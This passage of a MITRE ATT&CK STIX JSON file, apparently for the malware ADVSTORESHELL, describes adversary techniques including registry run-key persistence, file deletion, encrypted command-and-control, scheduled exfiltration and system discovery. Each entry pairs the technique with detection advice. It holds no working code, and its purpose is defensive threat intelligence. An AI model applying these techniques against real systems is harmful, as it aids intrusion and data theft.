                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1043"
                }, 
                {
                    "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.", 
                    "source_name": "University of Birmingham C2", 
                    "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
                }
            ], 
            "id": "attack-pattern--f879d51c-5476-431c-aedf-f14d207e4d1e", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "command-and-control"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "Commonly Used Port", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_data_sources": [
                "Packet capture", 
                "Netflow/Enclave netflow", 
                "Process use of network", 
                "Process monitoring"
            ], 
            "x_mitre_network_requirements": true, 
            "x_mitre_platforms": [
                "Linux", 
                "macOS", 
                "Windows"
            ]
        }, 
        {
            "created": "2017-05-31T21:30:49.988Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) The program will be executed under the context of the user and will have the account's associated permissions level.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.\n\nDetection: Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. (Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\nPlatforms: Windows\n\nData Sources: Windows Registry, File monitoring\n\nPermissions Required: User, Administrator", 
            "external_references": [
                {
                    "external_id": "T1060", 
                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1060"
                }, 
                {
                    "description": "Microsoft. (n.d.). Run and RunOnce Registry Keys. Retrieved November 12, 2014.", 
                    "source_name": "Microsoft Run Key", 
                    "url": "http://msdn.microsoft.com/en-us/library/aa376977"
                }, 
                {
                    "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.", 
                    "source_name": "TechNet Autoruns", 
                    "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902"
                }
            ], 
            "id": "attack-pattern--9422fc14-1c43-410d-ab0f-a709b76c72dc", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "persistence"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "Registry Run Keys / Start Folder", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_data_sources": [
                "Windows Registry", 
                "File monitoring"
            ], 
            "x_mitre_permissions_required": [
                "User", 
                "Administrator"
            ], 
            "x_mitre_platforms": [
                "Windows"
            ]
        }, 
        {
            "created": "2017-05-31T21:31:23.587Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in Persistence and Execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification. (Citation: Microsoft Reg) Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API (see examples).\n\nThe Registry of a remote system may be modified to aid in execution of files as part of Lateral Movement. It requires the remote Registry service to be running on the target system. (Citation: Microsoft Remote) Often Valid Accounts are required, along with access to the remote system's Windows Admin Shares for RPC communication.\n\nDetection: Modifications to the Registry are normal and occur throughout typical use of the Windows operating system. Changes to Registry entries that load software on Windows startup that do not correlate with known software, patch cycles, etc., are suspicious, as are additions or changes to files within the startup folder. Changes could also include new services and modification of existing binary paths to point to malicious files. If a change to a service-related entry occurs, then it will likely be followed by a local or remote service start or restart to execute the file.\n\nMonitor processes and command-line arguments for actions that could be taken to change or delete information in the Registry. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell, which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\nPlatforms: Windows\n\nData Sources: Windows Registry, File monitoring, Process monitoring, Process command-line parameters\n\nDefense Bypassed: Host forensic analysis\n\nPermissions Required: User, Administrator, SYSTEM\n\nContributors: Bartosz Jerzman, Travis Smith, Tripwire", 
            "external_references": [
                {
                    "external_id": "T1112", 
                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1112"
                }, 
                {
                    "description": "Microsoft. (2012, April 17). Reg. Retrieved May 1, 2015.", 
                    "source_name": "Microsoft Reg", 
                    "url": "https://technet.microsoft.com/en-us/library/cc732643.aspx"
                }, 
                {
                    "description": "Microsoft. (n.d.). Enable the Remote Registry Service. Retrieved May 1, 2015.", 
                    "source_name": "Microsoft Remote", 
                    "url": "https://technet.microsoft.com/en-us/library/cc754820.aspx"
                }
            ], 
            "id": "attack-pattern--57340c81-c025-4189-8fa0-fc7ede51bae4", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "defense-evasion"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "Modify Registry", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_contributors": [
                "Bartosz Jerzman", 
                "Travis Smith, Tripwire"
            ], 
            "x_mitre_data_sources": [
                "Windows Registry", 
                "File monitoring", 
                "Process monitoring", 
                "Process command-line parameters"
            ], 
            "x_mitre_defense_bypassed": [
                "Host forensic analysis"
            ], 
            "x_mitre_permissions_required": [
                "User", 
                "Administrator", 
                "SYSTEM"
            ], 
            "x_mitre_platforms": [
                "Windows"
            ]
        }, 
        {
            "created": "2017-05-31T21:31:17.915Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces behind as to what was done within a network and how. Adversaries may remove these files over the course of an intrusion to keep their footprint low or remove them at the end as part of the post-intrusion cleanup process.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native cmd functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)\n\nDetection: It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.\n\nPlatforms: Linux, Windows, macOS\n\nData Sources: Binary file metadata, File monitoring, Process command-line parameters\n\nDefense Bypassed: Host forensic analysis\n\nPermissions Required: User\n\nContributors: Walker Johnson", 
            "external_references": [
                {
                    "external_id": "T1107", 
                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1107"
                }, 
                {
                    "description": "Wilhoit, K. (2013, March 4). In-Depth Look: APT Attack Tools of the Trade. Retrieved December 2, 2015.", 
                    "source_name": "Trend Micro APT Attack Tools", 
                    "url": "http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/"
                }
            ], 
            "id": "attack-pattern--56fca983-1cf1-4fd1-bda0-5e170a37ab59", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "defense-evasion"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "File Deletion", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_contributors": [
                "Walker Johnson"
            ], 
            "x_mitre_data_sources": [
                "Binary file metadata", 
                "File monitoring", 
                "Process command-line parameters"
            ], 
            "x_mitre_defense_bypassed": [
                "Host forensic analysis"
            ], 
            "x_mitre_permissions_required": [
                "User"
            ], 
            "x_mitre_platforms": [
                "Linux", 
                "Windows", 
                "macOS"
            ]
        }, 
        {
            "created": "2017-05-31T21:30:35.334Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "Adversaries use command and control over an encrypted channel using a known encryption protocol like HTTPS or SSL/TLS. The use of strong encryption makes it difficult for defenders to detect signatures within adversary command and control traffic.\n\nSome adversaries may use other encryption protocols and algorithms with symmetric keys, such as RC4, that rely on encryption keys encoded into malware configuration files and not public key cryptography. Such keys may be obtained through malware reverse engineering.\n\nDetection: SSL/TLS inspection is one way of detecting command and control traffic within some encrypted communication channels. (Citation: SANS Decrypting SSL) SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation. (Citation: SEI SSL Inspection Risks)\n\nIf malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures. (Citation: Fidelis DarkComet)\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\n\nPlatforms: Linux, macOS, Windows\n\nData Sources: Packet capture, Netflow/Enclave netflow, Malware reverse engineering, Process use of network, Process monitoring, SSL/TLS inspection\n\nRequires Network: Yes", 
            "external_references": [
                {
                    "external_id": "T1032", 
                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1032"
                }, 
                {
                    "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.", 
                    "source_name": "University of Birmingham C2", 
                    "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
                }, 
                {
                    "description": "Butler, M. (2013, November). Finding Hidden Threats by Decrypting SSL. Retrieved April 5, 2016.", 
                    "source_name": "SANS Decrypting SSL", 
                    "url": "http://www.sans.org/reading-room/whitepapers/analyst/finding-hidden-threats-decrypting-ssl-34840"
                }, 
                {
                    "description": "Dormann, W. (2015, March 13). The Risks of SSL Inspection. Retrieved April 5, 2016.", 
                    "source_name": "SEI SSL Inspection Risks", 
                    "url": "https://insights.sei.cmu.edu/cert/2015/03/the-risks-of-ssl-inspection.html"
                }, 
                {
                    "description": "Fidelis Cybersecurity. (2015, August 4). Looking at the Sky for a DarkComet. Retrieved April 5, 2016.", 
                    "source_name": "Fidelis DarkComet", 
                    "url": "https://www.fidelissecurity.com/sites/default/files/FTA%201018%20looking%20at%20the%20sky%20for%20a%20dark%20comet.pdf"
                }
            ], 
            "id": "attack-pattern--4b74a1d4-b0e9-4ef1-93f1-14ecc6e2f5b5", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "command-and-control"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "Standard Cryptographic Protocol", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_data_sources": [
                "Packet capture", 
                "Netflow/Enclave netflow", 
                "Malware reverse engineering", 
                "Process use of network", 
                "Process monitoring", 
                "SSL/TLS inspection"
            ], 
            "x_mitre_network_requirements": true, 
            "x_mitre_platforms": [
                "Linux", 
                "macOS", 
                "Windows"
            ]
        }, 
        {
            "created": "2017-05-31T21:30:30.260Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "Data is encrypted before being exfiltrated in order to hide the information that is being exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by a defender. The encryption is performed by a utility, programming library, or custom algorithm on the data itself and is considered separate from any encryption performed by the command and control or file transfer protocol. Common file archive formats that can encrypt files are RAR and zip.\n\nOther exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over Command and Control Channel and Exfiltration Over Alternative Protocol\n\nDetection: Encryption software and encrypted files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known encryption utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used. Often the encryption key is stated within command-line invocation of the software. \n\nA process that loads the Windows DLL crypt32.dll may be used to perform encryption, decryption, or verification of file signatures. \n\nNetwork traffic may also be analyzed for entropy to determine if encrypted data is being transmitted. (Citation: Zhang 2013) If the communications channel is unencrypted, encrypted files of known file types can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers. (Citation: Wikipedia File Header Signatures)\n\nPlatforms: Linux, macOS, Windows\n\nData Sources: File monitoring, Binary file metadata, Process command-line parameters, Process monitoring\n\nRequires Network: No", 
            "external_references": [
                {
                    "external_id": "T1022", 
                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1022"
                }, 
                {
                    "description": "Zhang, H., Papadopoulos, C., & Massey, D. (2013, April). Detecting encrypted botnet traffic. Retrieved August 19, 2015.", 
                    "source_name": "Zhang 2013", 
                    "url": "http://www.netsec.colostate.edu/~zhang/DetectingEncryptedBotnetTraffic.pdf"
                }, 
                {
                    "description": "Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016.", 
                    "source_name": "Wikipedia File Header Signatures", 
                    "url": "https://en.wikipedia.org/wiki/List%20of%20file%20signatures"
                }
            ], 
            "id": "attack-pattern--d54416bd-0803-41ca-870a-ce1af7c05638", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "exfiltration"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "Data Encrypted", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_data_sources": [
                "File monitoring", 
                "Binary file metadata", 
                "Process command-line parameters", 
                "Process monitoring"
            ], 
            "x_mitre_network_requirements": false, 
            "x_mitre_platforms": [
                "Linux", 
                "macOS", 
                "Windows"
            ]
        }, 
        {
            "created": "2017-05-31T21:31:04.307Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture.\n\n===Windows===\n\nExample commands and utilities that obtain this information include <code>ver</code>, Systeminfo, and <code>dir</code> within cmd for identifying information based on present files and directories.\n\n===Mac===\n\nOn Mac, the <code>systemsetup</code> command gives a detailed breakdown of the system, but it requires administrative privileges. Additionally, the <code>system_profiler</code> gives a very detailed breakdown of configurations, firewall rules, mounted volumes, hardware, and many other things without needing elevated permissions.\n\nDetection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\nPlatforms: Linux, macOS, Windows\n\nData Sources: Process command-line parameters, Process monitoring\n\nPermissions Required: User", 
            "external_references": [
                {
                    "external_id": "T1082", 
                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1082"
                }
            ], 
            "id": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "discovery"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "System Information Discovery", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_data_sources": [
                "Process command-line parameters", 
                "Process monitoring"
            ], 
            "x_mitre_permissions_required": [
                "User"
            ], 
            "x_mitre_platforms": [
                "Linux", 
                "macOS", 
                "Windows"
            ]
        }, 
        {
            "created": "2017-05-31T21:30:25.584Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. (Citation: Wikipedia Windows Registry) Some of the information may help adversaries to further their operation within a network.\n\nDetection: System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as Reg or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\nPlatforms: Windows\n\nData Sources: Windows Registry, Process monitoring, Process command-line parameters\n\nPermissions Required: User, Administrator, SYSTEM", 
            "external_references": [
                {
                    "external_id": "T1012", 
                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1012"
                }, 
                {
                    "description": "Wikipedia. (n.d.). Windows Registry. Retrieved February 2, 2015.", 
                    "source_name": "Wikipedia Windows Registry", 
                    "url": "https://en.wikipedia.org/wiki/Windows%20Registry"
                }
            ], 
            "id": "attack-pattern--c32f7008-9fea-41f7-8366-5eb9b74bd896", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "discovery"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "Query Registry", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_data_sources": [
                "Windows Registry", 
                "Process monitoring", 
                "Process command-line parameters"
            ], 
            "x_mitre_permissions_required": [
                "User", 
                "Administrator", 
                "SYSTEM"
            ], 
            "x_mitre_platforms": [
                "Windows"
            ]
        }, 
        {
            "created": "2017-05-31T21:30:34.139Z", 
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5", 
            "description": "Data exfiltration may be performed only at certain times of day or at certain intervals.  This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over Command and Control Channel and Exfiltration Over Alternative Protocol.\n\nDetection: Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious. Network connections to the same destination that occur at the same time of day for multiple days are suspicious.\n\nPlatforms: Linux, macOS, Windows\n\nData Sources: Netflow/Enclave netflow, Process use of network, Process monitoring\n\nRequires Network: Yes", 
            "external_references": [
                {
                    "external_id": "T1029", 
                    "source_name": "mitre-attack", 
                    "url": "https://attack.mitre.org/wiki/Technique/T1029"
                }
            ], 
            "id": "attack-pattern--4eeaf8a9-c86b-4954-a663-9555fb406466", 
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack", 
                    "phase_name": "exfiltration"
                }
            ], 
            "modified": "2018-04-18T17:59:24.739Z", 
            "name": "Scheduled Transfer", 
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ], 
            "type": "attack-pattern", 
            "x_mitre_data_sources": [
                "Netflow/Enclave netflow", 
                "Process use of network", 
                "Process monitoring"
            ], 
            "x_mitre_network_requirements": true, 
            "x_mitre_platforms": [
                "Linux", 
                "macOS", 
                "Windows"
            ]
        }
    ], 
    "hash": "fb4acedb9ff509041568908faa8839d33f7b0609eece3238b5040658bfe68727", 
    "name": "ADVSTORESHELL"
}